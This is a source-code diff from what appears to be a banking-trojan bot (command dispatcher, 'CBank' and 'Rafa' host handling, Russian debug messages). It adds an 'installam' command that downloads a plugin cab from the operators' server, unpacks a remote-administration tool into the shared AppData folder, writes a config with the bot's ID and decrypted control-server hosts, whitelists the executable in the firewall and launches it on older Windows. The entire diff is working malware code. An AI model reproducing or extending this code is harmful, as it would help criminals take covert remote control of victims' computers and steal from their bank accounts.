@@ -20,6 +20,7 @@
 #include "BotDef.h"
 #include "StrConsts.h"
 #include "Installer.h"
+#include "VideoRecorder.h"
 
 #include <shlobj.h>
 #include <shlwapi.h>
@@ -1213,6 +1214,59 @@ bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+static DWORD WINAPI ThreadInstallam(void*)
+{
+	TASKDBG( "Ammy", "Скачиваем ammy.plug" );
+	BYTE* data = 0;
+	DWORD size = 0;
+	data = Plugin::Download( "ammy.plug", 0, &size, false );
+	if( data )
+	{
+		char tempCab[MAX_PATH], folderAmmy[MAX_PATH];
+		File::GetTempName(tempCab);
+		File::WriteBufferA( tempCab, data, size );
+		TASKDBG( "Ammy", "Сохранили ammy.plug в %s", tempCab );
+		pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA,  0, 0, folderAmmy );
+		pPathAppendA( folderAmmy, "ammy" );
+		pCreateDirectoryA( folderAmmy, 0 );
+		if( ExtractCab( tempCab, folderAmmy ) )
+		{
+			TASKDBG( "Ammy", "Распаковали в папку %s", folderAmmy );
+
+			//создаем файл am.cfg
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			char* mem = (char*)HEAP::Alloc(1024);
+			char* p = mem;
+			p += pwsprintfA( mem, "%s\r\n", Bot->UID().t_str() );
+			TStrEnum E( Rafa::Hosts(), RAFAHOSTS_PARAM_ENCRYPTED, 0x86D19DC3 /* __RAFA_HOSTS__ */ );
+			while( E.Next() )
+				p += pwsprintfA( p, "%s\r\n", E.Line().t_str() );
+			pPathAppendA( folderAmmy, "am.cfg" );
+			File::WriteBufferA( folderAmmy, mem, p - mem );
+			HEAP::Free(mem);
+
+			pPathRemoveFileSpecA(folderAmmy);
+			pPathAppendA( folderAmmy, "aa.exe" );
+			if( AddAllowedprogram(folderAmmy) )
+			{
+				RunFileA(folderAmmy);
+				TASKDBG( "Ammy", "ammy успешно запущен" );
+			}
+		}
+		pDeleteFileA(tempCab);
+	}
+	return 0;
+}
+
+bool ExecuteInstallam(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+    OSVERSIONINFOA ver;
+    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
+    pGetVersionExA(&ver);
+	if( ver.dwMajorVersion < 6 ) //команда работает только для XP
+		RunThread( ThreadInstallam, 0 );
+	return true;
+}
 
 /*
 
@@ -1338,8 +1392,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandDownload2[]     = {'d','o','w','n','l','o','a','d','2',0};
 	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
 	const static char CommandTiny[]			 = {'t','i','n','y',0};
+	const static char CommandInstallam[]	 = {'i','n','s','t','a','l','l','a','m',0};
 
-	int Index = StrIndexOf( Command, false, 18,
+	int Index = StrIndexOf( Command, false, 19,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1357,7 +1412,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandAddTrust,
 							(PCHAR)CommandDownload2,
 							(PCHAR)CommandCBank,
-							(PCHAR)CommandTiny
+							(PCHAR)CommandTiny,
+							(PCHAR)CommandInstallam
 						  );
 
 
@@ -1381,6 +1437,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 15: return ExecuteDownload2;
 		case 16: return ExecuteCBank;
 		case 17: return ExecuteTiny;
+		case 18: return ExecuteInstallam;
 
     default: ;
 	}
